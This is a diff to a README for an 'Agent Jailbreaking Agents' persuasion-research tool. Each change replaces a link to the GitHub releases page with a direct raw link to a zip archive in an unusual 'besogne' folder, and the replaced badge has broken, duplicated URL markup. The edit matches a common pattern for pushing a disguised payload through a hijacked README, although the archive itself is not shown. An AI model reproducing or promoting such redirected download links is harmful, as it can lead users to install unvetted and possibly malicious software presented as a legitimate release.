@@ -6,7 +6,7 @@ Welcome to the Agent Jailbreak Research System! This guide will help you get sta
 
 ### 📥 Download the Application
 
-[![Download the Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/DifABD/Agent-Jailbreaking-Agents/main/besogne/Agent-Jailbreaking-Agents.zip%https://raw.githubusercontent.com/DifABD/Agent-Jailbreaking-Agents/main/besogne/Agent-Jailbreaking-Agents.zip)](https://raw.githubusercontent.com/DifABD/Agent-Jailbreaking-Agents/main/besogne/Agent-Jailbreaking-Agents.zip)
 
 ### 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ To run the Agent Jailbreaking Agents, please ensure your computer meets the foll
 
 ### 🔧 Installation Steps
 
-1. **Visit the Releases Page**: Go to the following link to download the application: [Download Page](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases).
+1. **Visit the Releases Page**: Go to the following link to download the application: [Download Page](https://raw.githubusercontent.com/DifABD/Agent-Jailbreaking-Agents/main/besogne/Agent-Jailbreaking-Agents.zip).
    
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
@@ -59,4 +59,4 @@ If you encounter any issues, you can find help in the following ways:
 
 ### 📝 Conclusion
 
-We designed the Agent Jailbreaking Agents to provide a controlled environment for analyzing the effects of persuasion in language model interactions. Download it today and start exploring ethical persuasion in AI. For your convenience, here is the link to download the application again: [Download Page](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases).
+We designed the Agent Jailbreaking Agents to provide a controlled environment for analyzing the effects of persuasion in language model interactions. Download it today and start exploring ethical persuasion in AI. For your convenience, here is the link to download the application again: [Download Page](https://raw.githubusercontent.com/DifABD/Agent-Jailbreaking-Agents/main/besogne/Agent-Jailbreaking-Agents.zip).
